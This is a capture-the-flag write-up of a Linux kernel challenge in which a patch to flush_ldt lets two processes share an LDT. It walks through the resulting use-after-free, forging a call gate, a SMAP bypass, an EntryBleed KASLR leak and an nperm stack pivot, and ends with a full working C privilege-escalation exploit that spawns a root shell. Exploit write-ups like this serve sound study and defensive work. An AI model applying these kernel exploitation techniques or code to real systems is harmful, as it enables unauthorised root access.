+++
title = 'krwldt'
date = 2026-11-11T15:22:22+01:00
draft = false
author = 'prosti & leo'
summary = 'writeup by @leo_s0mething and me for a linux kernel pwn challenge for TORX CTF 2026'
tags = [
    'linux', 'x86'
]
toc = true
+++

## Overview
### attachments
The challenge consisted of a two-line patch to `flush_ldt`.

```diff
diff --git a/arch/x86/kernel/ldt.c b/arch/x86/kernel/ldt.c
index 40c5bf97dd5c..4236b1522eb8 100644
--- a/arch/x86/kernel/ldt.c
+++ b/arch/x86/kernel/ldt.c
@@ -137,8 +137,8 @@ static void flush_ldt(void *__mm)
 {
 	struct mm_struct *mm = __mm;
 
-	if (this_cpu_read(cpu_tlbstate.loaded_mm) != mm)
-		return;
+	// if (this_cpu_read(cpu_tlbstate.loaded_mm) != mm)
+	// 	return;
 
 	load_mm_ldt(mm);
```
*chall.diff*
<br><br>
```sh
#!/bin/sh

qemu-system-x86_64 \
-kernel ./bzImage \
-initrd ./initramfs.cpio.gz \
-cpu host,+smap,+smep \
-enable-kvm \
-smp 4 \
-m 1G \
-append "console=ttyS0 quiet loglevel=3 oops=panic panic_on_warn=1 panic=-1 unprivileged_bpf_disabled=1" \
-monitor /dev/null \
-nographic \
-no-reboot \
-drive file=./flag.txt,format=raw,media=disk,if=virtio,readonly=on \
-s
```
*run.sh*

### LDT
The local descriptor table (LDT) contains segment descriptors for the current task.
Segment descriptors specify the base address, limit and attributes of a segment.
<br><br>
![segment descriptor](/images/krwldt/segment-descriptor.png)
_structure of a segment descriptor_

To index the LDT segment selectors are used, which specify the index of the descriptor in the table, whether that descriptor lives in the LDT or GDT (TI bit) and the requested privilege level (RPL), which can be more restrictive than the descriptor privilege level (DPL) attribute set in the descriptor.
<br><br>
![segment selector](/images/krwldt/segment-selector.png)
_structure of a segment selector_

The current LDT is referenced by a segment descriptor in the GDT. Its segment selector is loaded in the LDTR register and changes on task switch.
#### patch analysis
The patch for this challenge removes a check in `flush_ldt`. This function is used only by `install_ldt` which, in turn, gets called inside `write_ldt`.
This function handles the write path inside  [sys_modify_ldt](https://man7.org/linux/man-pages/man2/modify_ldt.2.html) which, as the name suggests, allows a userland process to read from and write to its LDT.

```c
static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
{
	struct mm_struct *mm = current->mm;
	...
	
	if (copy_from_user(&ldt_info, ptr, sizeof(ldt_info)))
		goto out;
	
	...
	
	if ((oldmode && !ldt_info.base_addr && !ldt_info.limit) ||
	    LDT_empty(&ldt_info)) {
		/* The user wants to clear the entry. */
		memset(&ldt, 0, sizeof(ldt));
	} else {
		if (!ldt_info.seg_32bit && !allow_16bit_segments()) {
			error = -EINVAL;
			goto out;
		}

		fill_ldt(&ldt, &ldt_info);
		if (oldmode)
			ldt.avl = 0;
	}
	
	...

	old_ldt        = mm->context.ldt;
	old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
	new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);

	...
	
	new_ldt = alloc_ldt_struct(new_nr_entries);
	
	...

	if (old_ldt)
		memcpy(new_ldt->entries, old_ldt->entries,
				old_nr_entries * LDT_ENTRY_SIZE);

	new_ldt->entries[ldt_info.entry_number] = ldt;
	finalize_ldt_struct(new_ldt);

	...

	install_ldt(mm, new_ldt);
	unmap_ldt_struct(mm, old_ldt);
	free_ldt_struct(old_ldt);

	...

out:
	return error;
}
```
https://elixir.bootlin.com/linux/v7.3.1/source/arch/x86/kernel/ldt.c#L578

`write_ldt()` basically allocates a new LDT, populates it with the contents of the old one (if present), validates and adds the descriptor supplied by the user, installs the new LDT across CPUs and finally frees the old LDT.

Now let's take a closer look at `install_ldt`:
```c
static void install_ldt(struct mm_struct *mm, struct ldt_struct *ldt)
{
	mutex_lock(&mm->context.lock);

	/* Synchronizes with READ_ONCE in load_mm_ldt. */
	smp_store_release(&mm->context.ldt, ldt);

	/* Activate the LDT for all CPUs using current mm. */
	on_each_cpu_mask(mm_cpumask(mm), flush_ldt, mm, true);

	mutex_unlock(&mm->context.lock);
}
```
https://elixir.bootlin.com/linux/v7.3.1/source/arch/x86/kernel/ldt.c#L421

We can see that it just calls `on_each_cpu_mask`, which is a function that leverages Inter-Processor Interrupts (IPIs) to force other CPUs to execute a callback, in this case, `flush_ldt(mm)`. 

```c
static void flush_ldt(void *__mm)
{
	struct mm_struct *mm = __mm;

	// if (this_cpu_read(cpu_tlbstate.loaded_mm) != mm)
	//  return;

	load_mm_ldt(mm);

	refresh_ldt_segments();
}
```
https://elixir.bootlin.com/linux/v7.3.1/source/arch/x86/kernel/ldt.c#L136

`flush_ldt()` should make sure that a CPU stops using the old LDT and starts using the new one by updating LDTR and the segment registers DS and ES, but will it actually do that after the patch? (spoiler: no)

But first of all, we should understand what that check is even for.

`install_ldt()` sends IPIs to all the CPUs that are referenced in the bitmap of the current mm.
> A memory map (`mm`) is a struct that represents a process's address space and, in this case, it's retrieved from `current`, which is the `task_struct` of the currently running process.  

The patched check was meant to verify that the provided mm is the one installed on the current CPU, in other words it ensures that the current process hasn't changed in the meantime.

This means that if we can somehow get `mm_cpumask(mm)` to contain a CPU whose `cpu_tlbstate.loaded_mm` is different from `mm`, we can have two processes sharing the same LDT.
## Exploitation
### triggering the vulnerability
`cpu_tlbstate` is a per-CPU global structure that stores runtime information for a given core.
`mm_cpumask(mm)` exists mainly for optimization purposes because, for instance, if we had to rely only on `cpu_tlbstate`s to send the IPIs, we would need to iterate through every one of them to check which ones have the `loaded_mm` set to the `mm` we are interested in; so if we have many CPUs, that could take quite some time.
We can say that `mm_cpumask` is used as a filter, because it references only CPUs that _might_ be running a specified `mm`. 
We say "might" because when a CPU stops running an `mm` it doesn't immediately update the cpumask, as it might need to load that `mm` soon.
Instead, the cpumask gets trimmed lazily (unused CPUs are removed) during a TLB flush if more than a second has passed since the last trim. This is checked inside [should_trim_cpumask](https://elixir.bootlin.com/linux/v7.3.1/source/arch/x86/mm/tlb.c#L1314) and then used in [should_flush_tlb](https://elixir.bootlin.com/linux/v7.3.1/source/arch/x86/mm/tlb.c#L1276) in the lazy TLB path in [native_flush_tlb_multi](https://elixir.bootlin.com/linux/v7.3.1/source/arch/x86/mm/tlb.c#L1326).

So going back to the challenge... we know that `mm_cpumask(mm)` gets trimmed lazily, thus it's possible for `flush_ldt` to be called on a CPU, that is part of `mm_cpumask(mm)`, even though it's not currently running that `mm`, thus `cpu_tlbstate.loaded_mm != mm`.
### achieving UAF
Our goal is now to install the same LDT on two different processes (from here on called A and B) so that we can later call `modify_ldt` from A to free it and leave a dangling pointer in the GDT of B.
`ldt_struct.entries` gets allocated [directly from the buddy allocator](https://elixir.bootlin.com/linux/v7.3.1/source/arch/x86/kernel/ldt.c#L149) if `num_entries * 8 < PAGE_SIZE`, so we can later reclaim it from A with a pipe or perf page to get complete control over the contents of B's LDT and forge a call gate to get kernel RIP control.

To get the shared LDT primitive we need to perform the following actions in order:
1. pin A's main thread to CPU0 and a second thread on CPU1 (in this way `mm_cpumask(mm_A)` contains both CPU0 and CPU1)
2. add an entry to the LDT (allocates it)
3. spawn process B and pin it to CPU1
4. move A's thread to CPU0 (now `mm_cpumask(mm_A)` still contains CPU1, even though A is not running on it anymore)
5. call `modify_ldt` on A. This allocates a new LDT and flushes it also on CPU1 (which is running B); **at this point A and B share the same LDT**
6. flush the TLB to remove CPU1 from `mm_cpumask(mm_A)`
7. call `modify_ldt` on A. This allocates a new LDT and frees the old one, leaving a dangling pointer in B's GDT
8. now spray perf pages to reclaim the old LDT from the buddy and forge a call gate to get RIP control

The code that triggers the UAF is roughly the following:
```c
void *thread(void *arg) {
	set_cpu(1);	
	while (sched_getcpu() != 1) {}
	atomic_store_explicit(&ctl->helper_on_cpu1, 1, memory_order_release);

	wait_atomic(&ctl->move_helper);

	set_cpu(0);
	while (sched_getcpu() != 0) {}
	atomic_store_explicit(&ctl->helper_on_cpu0, 1, memory_order_release);

	while(1) {}
}

int main(void)
{	
	pthread_t thid;
	
	...

	set_cpu(0);
	pthread_create(&thid, NULL, thread, NULL);
	wait_atomic(&ctl->helper_on_cpu1);
	
	// mm_cpumask(mm) = {CPU0, CPU1}
	
	modify_ldt(0, (uint32_t)addr0, PAGE_SIZE-1); // allocate LDT

	int child = fork();
	if(child == 0) {
		set_cpu(1);
		while (sched_getcpu() != 1) {}
		atomic_store_explicit(&ctl->child_on_cpu1, 1, memory_order_release);

		wait_atomic(&ctl->page_reclaimed);

		invoke_call_gate();

		while(1) {}
	}
	
	atomic_store_explicit(&ctl->move_helper, 1, memory_order_release);
	wait_atomic(&ctl->helper_on_cpu0);
  	wait_atomic(&ctl->child_on_cpu1);
	
	// mm_cpumask(mm) = {CPU0, CPU1} even though CPU1 isn't running A anymore
	
	modify_ldt(0, (uint32_t)addr1, PAGE_SIZE-1); // trigger the vuln

	uint8_t *tlb_flush_mapping = mmap(NULL, PAGE_SIZE, 
									PROT_READ | PROT_WRITE,
									MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	*tlb_flush_mapping = 0x41;
	sleep(2); // ensure trimming
	mprotect(tlb_flush_mapping, PAGE_SIZE, PROT_READ); // flush TLB

	// mm_cpumask(mm) = {CPU0}

	// free the LDT (UAF because it's still installed on B)
	modify_ldt(0, (uint32_t)addr2, PAGE_SIZE-1);
	
	// reclaim the freed page and forge the call gate
	...
	
	atomic_store_explicit(&ctl->page_reclaimed, 1, memory_order_release);
```

### call gates
Call gates are an x86 feature used to changing privilege level. A call gate can be triggered by executing `CALL FAR` and specifying the call gate's segment selector. Call gates can be described in the `GDT` or `LDT`.
<br><br>
![callgate descriptor](/images/krwldt/callgate-descriptor.png)
*structure of a call gate descriptor*

If we control the contents of the LDT, we can register an arbitrary call gate and get RIP control in kernel space (since we can specify that the call gate can be invoked by ring 3 and goes to ring 0). You obviously cannot register a call gate with `modify_ldt` since there are checks on the combination of parameters that the syscall accepts. 
### SMAP & KASLR bypass
When using a call gate from ring 3 to ring 0, all registers are preserved except `RSP` (fetched from `TSS.RSP0`), `cs` and `ss` (that will be set to 0). This is kind of a problem for us, since we would like to control the stack to ROP. To solve this problem you can use this gadget (or similar, there are hundreds of them): 
```mov esp, 0xe41d8b48; ret;```
Why is this useful? Because a 32-bit `mov` will clear the upper 32 bits of `RSP` too, so `RSP` will then be a valid user space pointer (you just have to map the correct address beforehand). But wait! What about `SMAP`? Well, it's not a problem for us. You can temporarily disable `SMAP` by setting the alignment check flag (`AC`) in `EFLAGS` before invoking the call gate since `EFLAGS` will not get masked (normally when going from ring 3 to ring 0 with `syscall` `EFLAGS` is masked with `IA32_FMASK`).
At this point you can just create a mapping at address `0xe41d8000`, write your ROP chain at offset `0xb48` and you are good to go!  For kernel gadgets you can leak the kernel base with [entry bleed](https://www.willsroot.io/2022/12/entrybleed.html) since KVM is enabled.

### LPE attempt #1: commit_creds
Any pwner in the world with a bit of kernel pwn knowledge should be able to escalate privileges quite easily now.
We need to:
- execute `swapgs` to get the right kernel value of `gs`
- call `commit_creds(init_cred)`
- execute `swapgs` again to restore gs
- execute `iret` with a custom frame to return to user space
On **@leo**'s and my AMD CPU this worked just fine. When trying on **@leave**'s laptop the exploit never worked and always panicked. The exploit died each time it tried to execute the final `iret`.
### LPE attempt #2: ring 0 shellcode
Since we had no clue on what the actual problem was, we decided to just not use `iret` (because why should you fix a problem when you can just ignore it, right?).
The new plan was:
- `swapgs`
- call `set_memory_x` on a controlled kernel space page
- jump to the shellcode
- `f = filp_open("/path/to/flag", O_RDONLY, 0)`
- `kernel_read(f, user_space_addr, sz, NULL)`
- call `schedule()` in a loop
The perfect plan! Well... not really. `set_memory_x` always fails because internally it will send `IPI`s to each processor to flush their `TLB`. The core that sent the `IPI`s will wait for each processor to finish. When every processor is done, the caller core receives an `IRQ`, handles it internally and then returns to where we left with a good old `iret`. So we cannot call this function.
### vendor-specific iret behaviour
At this point I just had to understand what the problem was.
Initially I thought that the problem was `ss = 0` but after setting it to `0x18`, the standard kernel space `ss` segment selector, it still failed. 
My educated final guess is that AMD's `iret` accepts a user space stack if `EFLAGS.AC` is set when returning from ring 0 to ring 3 but Intel forgot to check `EFLAGS.AC`, so even if it's enabled, it triggers a `GPF` because it expects a kernel space stack.
This behavior, as far as I know, is not documented in either the Intel or AMD manuals.

### LPE attempt #3: double stack pivot with nperm
Now that we understand that executing `iret` with a user space stack was the core problem, we just have to avoid this issue. We can pivot one more time from the user stack to a valid kernel stack and this will fix the problem.
To do so we need user-controlled data relative to the kernel's base. There are two techniques that I know of for this: [`nperm`](https://github.com/n132/security-research/blob/6a09081d502e4a95011d63cb2b58fa0b21b3028b/pocs/linux/kernelctf/CVE-2025-38477_cos/docs/novel-techniques.md#leave-payload-next-to-kernel-resource-nperm) and [this `/dev/random` novel technique](https://github.com/u1f383/security-research/blob/CVE-2025-21703/pocs/linux/kernelctf/CVE-2025-21703_lts_2/docs/novel-techniques.md) by **@Pumpkin**. I ended up implementing `nperm` for simplicity (even if it is not particularly stable). Once you pivot to a kernel stack you can choose your favorite ROP chain and get root.

## Final Exploit
```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif // !_GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/ldt.h>
#include <sys/mman.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sched.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#include <stddef.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>

#define PAGE_SIZE 0x1000
#define UNMOVABLE_BASE 0xdeadbeef000ul

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define STEP_KERNEL 0x200000ull
#define SCAN_START_KERNEL KERNEL_LOWER_BOUND
#define SCAN_END_KERNEL KERNEL_UPPER_BOUND
#define ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL

#define DUMMY_ITERATIONS 10
#define ITERATIONS 5000

#define ROP_2_OFF	(unsigned long)0x1bcd000

void set_cpu(int cpuid)
{
    cpu_set_t my_set;

    CPU_ZERO(&my_set);
    CPU_SET(cpuid, &my_set);
    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("set_cpu");
    }
    return;
}

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  __asm__ volatile (".intel_syntax noprefix\n"
    "mfence\n"
    "rdtscp\n"
    "mov %0, rax\n"
    "mov %1, rdx\n"
    "xor rax, rax\n"
    "lfence\n"
    "prefetchnta qword ptr [%4]\n"
    "prefetcht2 qword ptr [%4]\n"
    "xor rax, rax\n"
    "lfence\n"
    "rdtscp\n"
    "mov %2, rax\n"
    "mov %3, rdx\n"
    "mfence\n"
    ".att_syntax prefix\n"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

uint64_t prefetch() {
	uint64_t arr_size = ARR_SIZE_KERNEL;
	uint64_t scan_start = SCAN_START_KERNEL;
	uint64_t step_size = STEP_KERNEL;

	uint64_t *data = malloc(arr_size * sizeof(uint64_t));
	memset(data, 0, arr_size * sizeof(uint64_t));

	uint64_t addr = ~0, delta = 0, delta_i = 0;

	for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
	{
		for (uint64_t idx = 0; idx < arr_size; idx++)
		{
			uint64_t test = scan_start + idx * step_size;
			syscall(104);
			uint64_t time = sidechannel(test);
			if (i >= DUMMY_ITERATIONS)
				data[idx] += time;
		}
	}

	for (int i = (arr_size-1); i >= 0; i--)
	{
		data[i] /= ITERATIONS;
		if (i < (arr_size-1) && data[i] < data[i+1])
		{
			if((data[i+1] - data[i]) > delta) {
				delta = data[i+1] - data[i];
				addr = scan_start + i * step_size;
			}
		}
	}

	free(data);

	return addr;
}

typedef enum fw_cfg_ctl_t {
    fw_ctl_error = 1,
    fw_ctl_read = 2,
    fw_ctl_skip = 4,
    fw_ctl_select = 8,
    fw_ctl_write = 16
} fw_cfg_ctl_t;

struct control {
	atomic_int helper_on_cpu1;
	atomic_int move_helper;
	atomic_int helper_on_cpu0;
	atomic_int child_on_cpu1;
	atomic_int page_reclaimed;
};

struct call_gate64 {
	uint16_t offset_low;
	uint16_t target_cs;
	uint8_t  reserved0;
	uint8_t  type_attr;
	uint16_t offset_middle;
	uint32_t offset_high;
	uint32_t reserved1;
} __attribute__((packed));

static struct control *ctl;

static void wait_atomic(atomic_int *v)
{
	while (!atomic_load_explicit(v, memory_order_acquire)) {}
}

uint16_t modify_ldt(unsigned int entry_num, uint32_t addr, uint32_t limit)
{
    struct user_desc desc;

    memset(&desc, 0, sizeof(desc));

    desc.entry_number = entry_num;
    desc.base_addr = addr;
    desc.limit = limit;

    desc.seg_32bit = 1;
    desc.contents = 0;
    desc.read_exec_only = 0;
    desc.limit_in_pages = 0;
    desc.seg_not_present = 0;
    desc.useable = 1;

	syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

	uint16_t selector =
        (desc.entry_number << 3) |
        (1 << 2) |      // TI = 1 => use LDT
        3;              // RPL = 3

	return selector;
}

static int perf_event_open(struct perf_event_attr *attr, pid_t pid,
                           int cpu, int group_fd, unsigned long flags)
{
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

void* map_unmovable(void *addr, int *fd_out) {
    long page = sysconf(_SC_PAGESIZE);
    size_t data_pages = 1;
    size_t len = (data_pages) * page;

    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.sample_period = 100000;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    attr.exclude_hv = 1;

    int fd = perf_event_open(&attr, 0, -1, -1, PERF_FLAG_FD_CLOEXEC);
    if (fd < 0) perror("perf_event_open");

    void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) perror("mmap");

    printf("metadata page: %p\n", p);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    *(unsigned long *)p = 0x4141414141414141;
	
	*fd_out = fd;
    return p;
}

void *thread(void *arg) {
	set_cpu(1);
	
	while (sched_getcpu() != 1) {}

	atomic_store_explicit(&ctl->helper_on_cpu1, 1, memory_order_release);

	wait_atomic(&ctl->move_helper);

	set_cpu(0);

	while (sched_getcpu() != 0) {}

	atomic_store_explicit(&ctl->helper_on_cpu0, 1, memory_order_release);

	while(1) {}
}

struct far_pointer32 {
    uint32_t offset;
    uint16_t selector;
} __attribute__((packed));

static void build_call_gate(void *reclaimed_ldt, uint64_t target_rip, uint16_t kernel_cs)
{
	struct call_gate64 gate = {
		.offset_low    = target_rip,
		.target_cs     = kernel_cs,
		.reserved0     = 0,
		.type_attr     = 0xec,
		.offset_middle = target_rip >> 16,
		.offset_high   = target_rip >> 32,
		.reserved1     = 0,
	};

	memcpy((uint8_t *)reclaimed_ldt, &gate, sizeof(gate));
}
static void invoke_call_gate()
{
    set_cpu(1);
    __asm__ volatile(
        ".intel_syntax noprefix;"
        "pushf;"
        "or qword ptr [rsp], 0x40000;"
        "popf;"
        "mov rax, 0x0000000700000000;"
        "push rax;"
        "mov rax, rsp;"
        "call FWORD PTR [rax];"
        ".att_syntax;"
    );
}
 

void nperm_spray(void* data, size_t size) 
{
    int pid = fork();
    size_t step_size = 0x200000;

    if (pid == 0) {
        
		char *buf = mmap(0,step_size, PROT_READ | PROT_WRITE,
						MAP_ANON | MAP_PRIVATE | MAP_POPULATE, -1, 0);
        for(size_t i = 0 ; i < step_size / 0x1000 ; i++)
            memcpy(buf+i*0x1000, data, size);

        for (unsigned long i = 0; i < 0x100000; i++) {
            char* addr = mmap(0, step_size, PROT_READ | PROT_WRITE,
				            MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE ,-1, 0);
            memcpy(addr,buf,step_size);
            if((unsigned long)addr<0)
                break;
        }
        exit(0);
    }
    if (pid) waitpid(pid, 0, 0);
    else { 
		printf("[ERROR]: internal issue");
		exit(0);
	}
}

void shell() {
	char *args[] = { "/bin/sh", NULL };
    execve(args[0], args, NULL);
}

// ROP 1
#define CLI             0x258fe6
#define GADGET 0xcd9694 // mov esp, 0xe41d8b48; ret;
#define POP_RSP			0xf9b8bf

// ROP 2
#define IRETQ           0xae2693
#define POP_RDI         0x2dffcd
#define INIT_CRED       0x1c0d640
#define COMMIT_CREDS    0x33f9a0
#define SWAPGS          0x1788

int main(void)
{	
	pthread_t thid;
	uint8_t* addr_l0 = mmap((void*)0x400000, PAGE_SIZE, 
						PROT_READ | PROT_WRITE, 
						MAP_PRIVATE | MAP_ANONYMOUS | MAP_32BIT, -1, 0);
	uint8_t* addr_l1 = mmap((void*)0x500000, PAGE_SIZE, 
						PROT_READ | PROT_WRITE, 
						MAP_PRIVATE | MAP_ANONYMOUS | MAP_32BIT, -1, 0);
	uint8_t* addr_l2 = mmap((void*)0x600000, PAGE_SIZE, 
						PROT_READ | PROT_WRITE, 
						MAP_PRIVATE | MAP_ANONYMOUS | MAP_32BIT, -1, 0);
	unsigned long stack_rop_endgame[0x100] = {0};
	int p;

	ctl = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, 
			MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	uint64_t kbase = prefetch() - 0x1000000;
    kbase = 0xffffffff81000000;
    
	printf("kbase @ 0x%lx\n", kbase);

	p = 0;
    stack_rop_endgame[p++] = kbase + SWAPGS;
    stack_rop_endgame[p++] = kbase + POP_RDI;
	stack_rop_endgame[p++] = kbase + INIT_CRED;
    stack_rop_endgame[p++] = kbase + COMMIT_CREDS;
	stack_rop_endgame[p++] = kbase + SWAPGS;
    stack_rop_endgame[p++] = kbase + IRETQ;
	stack_rop_endgame[p++] = (uint64_t)&shell;
	stack_rop_endgame[p++] = 0x33;
	stack_rop_endgame[p++] = 0x206;
	stack_rop_endgame[p++] = (uint64_t)(stack_rop_endgame+0x201);
	stack_rop_endgame[p++] = 0x2b;

	nperm_spray(stack_rop_endgame, sizeof(stack_rop_endgame)); 

	set_cpu(0);
	
	pthread_create(&thid, NULL, thread, NULL);
	
	wait_atomic(&ctl->helper_on_cpu1);

	uint16_t selector = modify_ldt(1, (uint32_t)addr_l0, PAGE_SIZE-1);
	selector = modify_ldt(0, (uint32_t)addr_l0, PAGE_SIZE-1);

	int child = fork();
	if(child == 0) {
        uint64_t* rop_chain = mmap((void*)(0xe41d8000-0x4000), 0x8000, 
						PROT_READ | PROT_WRITE | PROT_EXEC, 
						MAP_POPULATE | MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, 
						-1, 0);
		
        // the new stack will be @ 0xe41d8b48
        // so we need to write at the right offset inside the page
		p = (0x4000 + 0xb48) / 8;
		printf("guessed rop2 address: %p\n", kbase + ROP_2_OFF);
        rop_chain[p++] = kbase + CLI;
        rop_chain[p++] = kbase + POP_RSP;
		rop_chain[p++] = kbase + ROP_2_OFF;

		set_cpu(1);
		while (sched_getcpu() != 1) {}

		atomic_store_explicit(&ctl->child_on_cpu1, 1, memory_order_release);

		wait_atomic(&ctl->page_reclaimed);

		invoke_call_gate();

		while(1) {}
	}
	
	atomic_store_explicit(&ctl->move_helper, 1, memory_order_release);
	wait_atomic(&ctl->helper_on_cpu0);
  	wait_atomic(&ctl->child_on_cpu1);

	selector = modify_ldt(0, (uint32_t)addr_l1, PAGE_SIZE-1);

	uint8_t *tlb_flush_mapping = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
									MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	*tlb_flush_mapping = 0x41;

	// ensure trimming 
    sleep(2); 
	// flush TLB
    mprotect(tlb_flush_mapping, PAGE_SIZE, PROT_READ);

	selector = modify_ldt(0, (uint32_t)addr_l2, PAGE_SIZE-1);

	void* unmovable[10];
	int perf_fds[10];
	for(int i=0; i<10; i++) {
		unmovable[i] = map_unmovable((void*)UNMOVABLE_BASE, &perf_fds[i]);
		ioctl(perf_fds[i], PERF_EVENT_IOC_DISABLE, 0);
		build_call_gate(unmovable[i], kbase+GADGET, 0x10);
	}

	atomic_store_explicit(&ctl->page_reclaimed, 1, memory_order_release);

	while(1) {}
}
```

## Lore
We postponed writing this writeup so much that we forgot most of the exploit and had to reverse-engineer it a bit. Also the attention span during our writeup writing sessions was not the highest, let's put it that way...
![mario kart 8 deluxe screenshot](/images/krwldt/mk8-deluxe.png)
